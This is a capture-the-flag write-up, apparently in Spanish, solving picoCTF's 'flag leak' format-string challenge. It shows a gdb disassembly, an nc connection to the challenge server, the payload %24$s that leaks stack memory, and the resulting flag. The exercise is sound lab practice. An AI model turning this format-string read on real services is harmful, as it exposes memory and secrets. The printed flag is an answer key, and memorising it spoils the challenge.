# flag leak

## Objetivo
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/92/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/92/vuln.c). And connect with it using:`nc saturn.picoctf.net 49346`

## Pistas


| No. Pista | Pista          |
| --------- | -------------- |
| 1         | Format Strings |

## Solucion
```bash
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ gdb vuln                                      
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x08049333 <+0>:     endbr32
   0x08049337 <+4>:     push   %ebp
   0x08049338 <+5>:     mov    %esp,%ebp
   0x0804933a <+7>:     push   %ebx
   0x0804933b <+8>:     sub    $0xc4,%esp
   0x08049341 <+14>:    call   0x80491f0 <__x86.get_pc_thunk.bx>
   0x08049346 <+19>:    add    $0x2cba,%ebx
   0x0804934c <+25>:    sub    $0x8,%esp
   0x0804934f <+28>:    push   $0x40
   0x08049351 <+30>:    lea    -0x48(%ebp),%eax
   0x08049354 <+33>:    push   %eax
   0x08049355 <+34>:    call   0x80492b6 <readflag>
   0x0804935a <+39>:    add    $0x10,%esp
   0x0804935d <+42>:    sub    $0xc,%esp
   0x08049360 <+45>:    lea    -0x1f9c(%ebx),%eax
   0x08049366 <+51>:    push   %eax
   0x08049367 <+52>:    call   0x80490f0 <printf@plt>
   0x0804936c <+57>:    add    $0x10,%esp
   0x0804936f <+60>:    sub    $0x8,%esp
   0x08049372 <+63>:    lea    -0xc8(%ebp),%eax
   0x08049378 <+69>:    push   %eax
   0x08049379 <+70>:    lea    -0x1f6d(%ebx),%eax
   0x0804937f <+76>:    push   %eax
   0x08049380 <+77>:    call   0x8049180 <__isoc99_scanf@plt>
   0x08049385 <+82>:    add    $0x10,%esp
   0x08049388 <+85>:    sub    $0xc,%esp
   0x0804938b <+88>:    lea    -0x1f67(%ebx),%eax
   0x08049391 <+94>:    push   %eax
   0x08049392 <+95>:    call   0x8049120 <puts@plt>
   0x08049397 <+100>:   add    $0x10,%esp
   0x0804939a <+103>:   sub    $0xc,%esp
   0x0804939d <+106>:   lea    -0xc8(%ebp),%eax
   0x080493a3 <+112>:   push   %eax
   0x080493a4 <+113>:   call   0x80490f0 <printf@plt>
   0x080493a9 <+118>:   add    $0x10,%esp
   0x080493ac <+121>:   sub    $0xc,%esp
--Type <RET> for more, q to quit, c to continue without paging--
   0x080493af <+124>:   push   $0xa
   0x080493b1 <+126>:   call   0x8049170 <putchar@plt>
   0x080493b6 <+131>:   add    $0x10,%esp
   0x080493b9 <+134>:   nop
   0x080493ba <+135>:   mov    -0x4(%ebp),%ebx
   0x080493bd <+138>:   leave
   0x080493be <+139>:   ret
End of assembler dump.
(gdb) b *0x0804935a
Breakpoint 1 at 0x804935a
(gdb) r
Starting program: /home/kali/Documentos/binary/vuln 
(gdb) exit
                                                                                       
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ nc saturn.picoctf.net 49346
Tell me a story and then I'll tell you one >> %24$s
Here's a story -
picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
```

## Notas adicionales

## Referencias